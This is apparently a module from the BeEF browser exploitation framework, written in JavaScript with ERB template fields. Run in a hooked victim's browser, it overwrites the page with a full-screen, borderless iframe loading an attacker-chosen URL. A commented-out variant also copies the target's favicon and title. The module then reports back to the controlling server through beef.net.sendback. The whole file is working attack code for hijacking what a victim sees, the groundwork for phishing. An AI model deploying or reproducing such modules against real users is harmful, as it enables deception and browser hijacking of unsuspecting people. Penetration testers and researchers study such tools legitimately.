beef.execute(function() {
	
	/* 
	TODO:
	Automatically get and set iframe title.
	*/

	var result = 'Iframe successfully created!'	
	var title = '';
	var iframe_src = '<%= @iframe_src %>';
	var favicon = iframe_src + '/favicon.ico';

//	document.write('<html><head><title>' + title  + '</title><link rel="shortcut icon" href="' + favicon  + '" type="image/x-icon" /></head><body><iframe src="' + iframe_src  + '" width="100%" height="100%" frameborder="0" scrolling="no"></iframe></body></html>');

	document.write('<iframe src="' + iframe_src  + '" width="100%" height="100%" frameborder="0" scrolling="no"></iframe>');

	beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
});
